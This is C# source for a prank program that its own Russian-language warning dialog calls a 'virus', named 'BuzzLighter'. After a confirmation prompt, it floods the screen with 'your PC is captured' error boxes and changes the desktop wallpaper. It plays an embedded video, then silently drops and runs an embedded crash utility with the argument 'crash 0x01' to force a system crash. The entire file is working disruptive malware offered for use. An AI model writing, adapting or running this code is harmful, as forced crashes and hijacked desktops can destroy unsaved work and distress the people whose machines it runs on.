using BuzzLighter.Properties;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
class Program
{
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
    const uint MB_YESNO = 0x00000004;
    const uint MB_OK = 0x00000001;
    const uint MB_ICONWARNING = 0x00000030;
    const uint MB_ICONERROR = 0x00000010;
    const int IDYES = 6;
    private const int SPI_SETDESKWALLPAPER = 0x0014;
    private const int SPIF_UPDATEINIFILE = 0x01;
    private const int SPIF_SENDCHANGE = 0x02;
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static Random random = new Random();
    static void Main()
    {
        string tempPath = Path.Combine(Path.GetTempPath(), "i-_17_.bmp");
        using (var bitmap = BuzzLighter.Properties.Resources._6)
        {
            bitmap.Save(tempPath, ImageFormat.Bmp);
        }
        int message = MessageBox(IntPtr.Zero, "Предупреждение: автор не несет ответственности за последствия использования данного вируса. Вы подтверждаете свое желание запустить исполняемый файл?", "Предупреждение", MB_YESNO | MB_ICONWARNING);
        if (message == IDYES)
        {
            for (int i = 0; i < 10; i++)
            {
                int index = i;
                new Thread(() =>
                {
                    Thread.Sleep(random.Next(100, 400));
                    MessageBox(IntPtr.Zero, "ВАШ ПК ЗАХВАЧЕН БАЗЗ ЛАЙТЕРОМ!", "БАЗЗ ЛАЙТЕР", MB_OK | MB_ICONERROR);
                }).Start();
            }
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            video();
        }
        else
        {
            Environment.Exit(0);
        }
    static void video()
        {
            byte[][] videos = new byte[][]
            {
                BuzzLighter.Properties.Resources._1,
                BuzzLighter.Properties.Resources._2,
                BuzzLighter.Properties.Resources._3,
                BuzzLighter.Properties.Resources._4,
                BuzzLighter.Properties.Resources._5
            };
            int number1 = random.Next(5);
            string videoPath = Path.Combine(Path.GetTempPath(), number1 + ".mp4");
            byte[] videoData = videos[number1];
            File.WriteAllBytes(videoPath, videoData);

            Process.Start(new ProcessStartInfo
            {
                FileName = videoPath,
                UseShellExecute = true
            });
            Thread.Sleep(6000);
            RunEmbeddedExecutableWithArgs();

        }
        static void RunEmbeddedExecutableWithArgs()
        {
            byte[] exeBytes = BuzzLighter.Properties.Resources.notmyfaultc64;
            string tempFilePath = Path.GetTempFileName();
            File.WriteAllBytes(tempFilePath, exeBytes);
            var startInfo = new ProcessStartInfo(tempFilePath)
            {
                Arguments = "crash 0x01",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = false,
                RedirectStandardError = false
            };
            using var process = Process.Start(startInfo);
            process?.WaitForExit();
        }
    }
}